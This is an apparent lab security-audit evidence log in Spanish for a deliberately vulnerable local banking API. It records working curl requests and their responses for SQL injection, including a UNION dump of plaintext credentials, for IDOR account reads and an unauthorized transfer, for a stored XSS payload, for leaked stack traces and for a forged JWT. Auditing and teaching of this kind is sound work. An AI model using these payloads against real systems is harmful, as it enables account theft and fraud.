@@ -1,0 +1,349 @@
+InsecurePay - Evidencias periciales
+Fecha UTC: 2026-11-12 20:23:39
+Version auditada: antes
+API: http://localhost:8080/api
+Token carlos_mora obtenido: eyJhbGciOiJIUzI1NiJ9.eyJ...
+
+################################################################
+# HALLAZGO-01 | SQL Injection en GET /api/transacciones/buscar
+################################################################
+
+>>> Busqueda legitima de carlos_mora con el termino 'Reembolso'
+$ curl -G http://localhost:8080/api/transacciones/buscar --data-urlencode "termino=Reembolso" -H "Authorization: Bearer <TOKEN_CARLOS>"
+HTTP 200
+{
+  "total": 1,
+  "registros": [
+    {
+      "id": 3,
+      "origen": "María Rojas Soto",
+      "destino": "Carlos Mora Morales",
+      "monto": 15000.00,
+      "conceptoHtml": "<p>Reembolso almuerzo equipo de trabajo.</p>"
+    }
+  ]
+}
+
+>>> Payload booleano sin token: ' OR 1=1 --
+$ curl -G http://localhost:8080/api/transacciones/buscar --data-urlencode "termino=' OR 1=1 --" -H "Accept: application/json"
+HTTP 200
+{
+  "total": 4,
+  "registros": [
+    {
+      "id": 1,
+      "origen": "Carlos Mora Morales",
+      "destino": "María Rojas Soto",
+      "monto": 45000.00,
+      "conceptoHtml": "<p>Pago de servicios profesionales de programacion. <span style=\"color: green; font-weight: bold;\">Verificado</span></p>"
+    },
+    {
+      "id": 2,
+      "origen": "María Rojas Soto",
+      "destino": "Juan Pérez Delgado",
+      "monto": 120000.00,
+      "conceptoHtml": "<p>Cancelacion cuota de alquiler oficina central. Factura electronica #8849.</p>"
+    },
+    {
+      "id": 3,
+      "origen": "María Rojas Soto",
+      "destino": "Carlos Mora Morales",
+      "monto": 15000.00,
+      "conceptoHtml": "<p>Reembolso almuerzo equipo de trabajo.</p>"
+    },
+    {
+      "id": 4,
+      "origen": "Juan Pérez Delgado",
+      "destino": "Carlos Mora Morales",
+      "monto": 35000.00,
+      "conceptoHtml": "<p>Aporte fondo solidario cooperativo. <span style=\"color: blue;\">Transferencia inmediata SINPE Movil</span></p>"
+    }
+  ]
+}
+
+>>> Payload booleano con token de carlos_mora: ' OR '1'='1
+$ curl -G http://localhost:8080/api/transacciones/buscar --data-urlencode "termino=' OR '1'='1" -H "Authorization: Bearer <TOKEN_CARLOS>"
+HTTP 200
+{
+  "total": 4,
+  "registros": [
+    {
+      "id": 1,
+      "origen": "Carlos Mora Morales",
+      "destino": "María Rojas Soto",
+      "monto": 45000.00,
+      "conceptoHtml": "<p>Pago de servicios profesionales de programacion. <span style=\"color: green; font-weight: bold;\">Verificado</span></p>"
+    },
+    {
+      "id": 2,
+      "origen": "María Rojas Soto",
+      "destino": "Juan Pérez Delgado",
+      "monto": 120000.00,
+      "conceptoHtml": "<p>Cancelacion cuota de alquiler oficina central. Factura electronica #8849.</p>"
+    },
+    {
+      "id": 3,
+      "origen": "María Rojas Soto",
+      "destino": "Carlos Mora Morales",
+      "monto": 15000.00,
+      "conceptoHtml": "<p>Reembolso almuerzo equipo de trabajo.</p>"
+    },
+    {
+      "id": 4,
+      "origen": "Juan Pérez Delgado",
+      "destino": "Carlos Mora Morales",
+      "monto": 35000.00,
+      "conceptoHtml": "<p>Aporte fondo solidario cooperativo. <span style=\"color: blue;\">Transferencia inmediata SINPE Movil</span></p>"
+    }
+  ]
+}
+
+################################################################
+# HALLAZGO-02 | IDOR / BOLA en cuentas, saldos y transferencias
+################################################################
+
+>>> carlos_mora consulta su propia cuenta (ID 2)
+$ curl http://localhost:8080/api/cuentas/2 -H "Authorization: Bearer <TOKEN_CARLOS>"
+HTTP 200
+{
+  "id": 2,
+  "titular": "Carlos Mora Morales",
+  "numeroCuenta": "CR05015202001026458901",
+  "saldo": 250000.00,
+  "status": null,
+  "detail": null
+}
+
+>>> carlos_mora consulta la cuenta ID 3 (propiedad de maria_rojas)
+$ curl http://localhost:8080/api/cuentas/3 -H "Authorization: Bearer <TOKEN_CARLOS>"
+HTTP 200
+{
+  "id": 3,
+  "titular": "María Rojas Soto",
+  "numeroCuenta": "CR05015202001026458902",
+  "saldo": 4850000.00,
+  "status": null,
+  "title": null,
+  "detail": null
+}
+
+>>> carlos_mora consulta el saldo de la cuenta ID 3
+$ curl http://localhost:8080/api/cuentas/3/saldo -H "Authorization: Bearer <TOKEN_CARLOS>"
+HTTP 404
+{
+  "cuentaId": null,
+  "numeroCuenta": null,
+  "saldo": null,
+  "status": 404,
+  "title": null,
+  "detail": null
+}
+
+>>> carlos_mora lista las cuentas del usuario ID 4 (maria_rojas)
+$ curl http://localhost:8080/api/cuentas/usuario/4 -H "Authorization: Bearer <TOKEN_CARLOS>"
+HTTP 200
+{
+  "total": 1,
+  "cuentas": [
+    {
+      "id": 3,
+      "titular": "María Rojas Soto",
+      "numeroCuenta": "CR05015202001026458902",
+      "saldo": 4850000.00
+    }
+  ]
+}
+
+>>> Listado global de cuentas sin token
+$ curl http://localhost:8080/api/cuentas
+HTTP 200
+{
+  "total": 4,
+  "cuentas": [
+    {
+      "id": 1,
+      "titular": "Administrador General de Sistemas",
+      "numeroCuenta": "CR05015202001026458900",
+      "saldo": 50000000.00
+    },
+    {
+      "id": 2,
+      "titular": "Carlos Mora Morales",
+      "numeroCuenta": "CR05015202001026458901",
+      "saldo": 250000.00
+    },
+    {
+      "id": 3,
+      "titular": "María Rojas Soto",
+      "numeroCuenta": "CR05015202001026458902",
+      "saldo": 4850000.00
+    },
+    {
+      "id": 4,
+      "titular": "Juan Pérez Delgado",
+      "numeroCuenta": "CR05015202001026458903",
+      "saldo": 75000.00
+    }
+  ]
+}
+
+>>> carlos_mora debita 100000 CRC desde la cuenta ID 3 de maria_rojas hacia su cuenta CR05015202001026458901
+$ curl -X POST http://localhost:8080/api/transacciones/transferir -H "Authorization: Bearer <TOKEN_CARLOS>" -H "Content-Type: application/json" -d '{"cuentaOrigenId":3,"numeroCuentaDestino":"CR05015202001026458901","monto":100000,"conceptoHtml":"Transferencia no autorizada"}'
+HTTP 201
+{
+  "id": 5,
+  "origen": "CR05015202001026458902",
+  "titularOrigen": "María Rojas Soto",
+  "destino": "CR05015202001026458901",
+  "monto": 100000,
+  "estado": "COMPLETADA",
+  "status": null,
+  "title": null,
+  "detail": null
+}
+
+>>> maria_rojas verifica el saldo de su cuenta ID 3 (saldo inicial 4850000.00)
+HTTP 200
+{
+  "id": 3,
+  "numeroCuenta": "CR05015202001026458902",
+  "saldo": 4750000.00
+}
+
+################################################################
+# HALLAZGO-03 | Stored XSS en el concepto de transferencias
+################################################################
+
+>>> carlos_mora envia una transferencia con el vector XSS en el concepto
+$ curl -X POST http://localhost:8080/api/transacciones/transferir -H "Authorization: Bearer <TOKEN_CARLOS>" -H "Content-Type: application/json" -d '{"cuentaOrigenId":2,"numeroCuentaDestino":"CR05015202001026458902","monto":1000,"conceptoHtml":"Pago de Servicios <img src=\"x\" onerror=\"alert('AUDITORIA FORENSE: Brecha XSS confirmada. Sesion: ' + localStorage.getItem('insecure_pay_user'))\">"}'
+HTTP 201
+{
+  "id": 6,
+  "conceptoHtml": "Pago de Servicios <img src=\"x\" onerror=\"alert('AUDITORIA FORENSE: Brecha XSS confirmada. Sesion: ' + localStorage.getItem('insecure_pay_user'))\">",
+  "status": null,
+  "detail": null
+}
+
+>>> Lectura del comprobante persistido (transaccion 6) por la victima maria_rojas
+$ curl http://localhost:8080/api/transacciones/6 -H "Authorization: Bearer <TOKEN_MARIA>"
+HTTP 200
+{
+  "id": 6,
+  "conceptoHtml": "Pago de Servicios <img src=\"x\" onerror=\"alert('AUDITORIA FORENSE: Brecha XSS confirmada. Sesion: ' + localStorage.getItem('insecure_pay_user'))\">"
+}
+
+################################################################
+# HALLAZGO-04 | Contrasenas almacenadas en texto plano
+################################################################
+
+>>> Login con usuario inexistente (enumeracion de usuarios)
+$ curl -X POST http://localhost:8080/api/auth/login -H "Content-Type: application/json" -d '{"username":"usuario_fantasma","password":"x"}'
+HTTP 500
+{
+  "timestamp": "2026-11-12T20:23:39.722+00:00",
+  "status": 500,
+  "error": "Internal Server Error",
+  "trace": "java.lang.RuntimeException: Usuario no encontrado en InsecurePay: usuario_fantasma\n\tat cr.ac.ucr.if0009.insecurepay.service.AuthService.lambda$autenticar$0(AuthService.java:25)\n\tat java.base/java.util.Optional.orElseThrow(Optional.java:403)\n\tat cr.ac.ucr.if0009.insecurepay.service.AuthService.autenticar(AuthService.java:25)\n\tat cr.ac.ucr.if0009.insecurepay.controller.AuthController.login(AuthController.java:21)\n\tat java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)\n\tat java.base/java.lang.reflect.Method.invoke(Method.java:580)\n\tat org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:255)\n\tat org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:188)\n\tat org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invo ...[recortado]",
+  "message": "Usuario no encontrado en InsecurePay: usuario_fantasma",
+  "path": "/api/auth/login"
+}
+
+>>> Volcado de la tabla USUARIOS mediante UNION sobre la busqueda
+$ curl -G http://localhost:8080/api/transacciones/buscar --data-urlencode "termino=zzz' UNION ALL SELECT id, 2, 3, 0.00, username || ':' || password, TIMESTAMP '2026-01-01 00:00:00', rol FROM USUARIOS --" -H "Authorization: Bearer <TOKEN_CARLOS>"
+HTTP 200
+{
+  "total": 5,
+  "credenciales": [
+    {
+      "rol": "ADMIN",
+      "usuario:password": "admin:admin123"
+    },
+    {
+      "rol": "AUDITOR",
+      "usuario:password": "auditor_seguridad:auditor2026"
+    },
+    {
+      "rol": "CLIENTE",
+      "usuario:password": "carlos_mora:carlos123"
+    },
+    {
+      "rol": "CLIENTE",
+      "usuario:password": "maria_rojas:maria123"
+    },
+    {
+      "rol": "CLIENTE",
+      "usuario:password": "juan_perez:juan123"
+    }
+  ]
+}
+
+################################################################
+# HALLAZGO-05 | Fuga de trazas tecnicas y configuracion insegura
+################################################################
+
+>>> Comilla simple aislada en la busqueda
+$ curl -G http://localhost:8080/api/transacciones/buscar --data-urlencode "termino='" -H "Authorization: Bearer <TOKEN_CARLOS>"
+HTTP 500
+{
+  "timestamp": "2026-11-12T20:23:39.764+00:00",
+  "status": 500,
+  "error": "Internal Server Error",
+  "trace": "org.hibernate.exception.DataException: could not prepare statement [Invalid value \"CHARACTER VARYING(1)\" for parameter \"MOD argument\"; SQL statement:\nSELECT * FROM TRANSACCIONES WHERE concepto_html LIKE '%'%' OR estado LIKE '%'%' [90008-224]] [SELECT * FROM TRANSACCIONES WHERE concepto_html LIKE '%'%' OR estado LIKE '%'%']\n\tat org.hibernate.exception.internal.SQLExceptionTypeDelegate.convert(SQLExceptionTypeDelegate.java:55)\n\tat org.hibernate.exception.internal.StandardSQLExceptionConverter.convert(StandardSQLExceptionConverter.java:58)\n\tat org.hibernate.engine.jdbc.spi.SqlExceptionHelper.convert(SqlExceptionHelper.java:108)\n\tat org.hibernate.engine.jdbc.internal.StatementPreparerImpl$StatementPreparationTemplate.prepareStatement(StatementPreparerImpl.java:194)\n\tat org.hibernate.engine.jdbc.internal.StatementPreparerImpl.prepareQueryStatement(StatementPreparerImpl.java:155)\n\tat org.hiber ...[recortado]",
+  "message": "could not prepare statement [Invalid value \"CHARACTER VARYING(1)\" for parameter \"MOD argument\"; SQL statement:\nSELECT * FROM TRANSACCIONES WHERE concepto_html LIKE '%'%' OR estado LIKE '%'%' [90008-224]] [SELECT * FROM TRANSACCIONES WHERE concepto_html LIKE '%'%' OR estado LIKE '%'%']",
+  "path": "/api/transacciones/buscar"
+}
+
+>>> Identificador no numerico en /api/cuentas/{id}
+$ curl http://localhost:8080/api/cuentas/abc -H "Authorization: Bearer <TOKEN_CARLOS>"
+HTTP 400
+{
+  "timestamp": "2026-11-12T20:23:39.781+00:00",
+  "status": 400,
+  "error": "Bad Request",
+  "trace": "org.springframework.web.method.annotation.MethodArgumentTypeMismatchException: Failed to convert value of type 'java.lang.String' to required type 'java.lang.Long'; For input string: \"abc\"\n\tat org.springframework.web.method.annotation.AbstractNamedValueMethodArgumentResolver.convertIfNecessary(AbstractNamedValueMethodArgumentResolver.java:302)\n\tat org.springframework.web.method.annotation.AbstractNamedValueMethodArgumentResolver.resolveArgument(AbstractNamedValueMethodArgumentResolver.java:137)\n\tat org.springframework.web.method.support.HandlerMethodArgumentResolverComposite.resolveArgument(HandlerMethodArgumentResolverComposite.java:122)\n\tat org.springframework.web.method.support.InvocableHandlerMethod.getMethodArgumentValues(InvocableHandlerMethod.java:224)\n\tat org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:178)\n\tat org.spring ...[recortado]",
+  "message": "Failed to convert value of type 'java.lang.String' to required type 'java.lang.Long'; For input string: \"abc\"",
+  "path": "/api/cuentas/abc"
+}
+
+>>> Cuenta inexistente en /api/cuentas/{id}
+$ curl http://localhost:8080/api/cuentas/999 -H "Authorization: Bearer <TOKEN_CARLOS>"
+HTTP 500
+{
+  "timestamp": "2026-11-12T20:23:39.799+00:00",
+  "status": 500,
+  "error": "Internal Server Error",
+  "trace": "java.lang.RuntimeException: Cuenta bancaria no encontrada con ID: 999\n\tat cr.ac.ucr.if0009.insecurepay.service.CuentaService.lambda$obtenerPorId$0(CuentaService.java:32)\n\tat java.base/java.util.Optional.orElseThrow(Optional.java:403)\n\tat cr.ac.ucr.if0009.insecurepay.service.CuentaService.obtenerPorId(CuentaService.java:32)\n\tat cr.ac.ucr.if0009.insecurepay.controller.CuentaController.obtenerPorId(CuentaController.java:31)\n\tat java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)\n\tat java.base/java.lang.reflect.Method.invoke(Method.java:580)\n\tat org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:255)\n\tat org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:188)\n\tat org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerM ...[recortado]",
+  "message": "Cuenta bancaria no encontrada con ID: 999",
+  "path": "/api/cuentas/999"
+}
+
+>>> Cuerpo JSON malformado en /api/transacciones/transferir
+$ curl -X POST http://localhost:8080/api/transacciones/transferir -H "Content-Type: application/json" -d '{ json roto' -H "Authorization: Bearer <TOKEN_CARLOS>"
+HTTP 400
+{
+  "timestamp": "2026-11-12T20:23:39.815+00:00",
+  "status": 400,
+  "error": "Bad Request",
+  "trace": "org.springframework.http.converter.HttpMessageNotReadableException: JSON parse error: Unexpected character ('j' (code 106)): was expecting double-quote to start field name\n\tat org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.readJavaType(AbstractJackson2HttpMessageConverter.java:406)\n\tat org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.read(AbstractJackson2HttpMessageConverter.java:354)\n\tat org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodArgumentResolver.readWithMessageConverters(AbstractMessageConverterMethodArgumentResolver.java:184)\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestResponseBodyMethodProcessor.readWithMessageConverters(RequestResponseBodyMethodProcessor.java:161)\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestResponseBodyMethodProcessor.resolveAr ...[recortado]",
+  "message": "JSON parse error: Unexpected character ('j' (code 106)): was expecting double-quote to start field name",
+  "path": "/api/transacciones/transferir"
+}
+
+>>> Exposicion de la consola H2
+$ curl -o /dev/null -w '%{http_code}' http://localhost:8080/h2-console/
+HTTP 200
+
+>>> Token JWT forjado para maria_rojas con la clave publicada en application.properties
+$ curl http://localhost:8080/api/cuentas/3 -H "Authorization: Bearer <TOKEN_FORJADO_maria_rojas>"
+HTTP 200
+{
+  "id": 3,
+  "titular": "María Rojas Soto",
+  "numeroCuenta": "CR05015202001026458902",
+  "saldo": 4751000.00,
+  "status": null,
+  "title": null,
+  "detail": null
+}
+
+Fin de la ejecucion pericial.
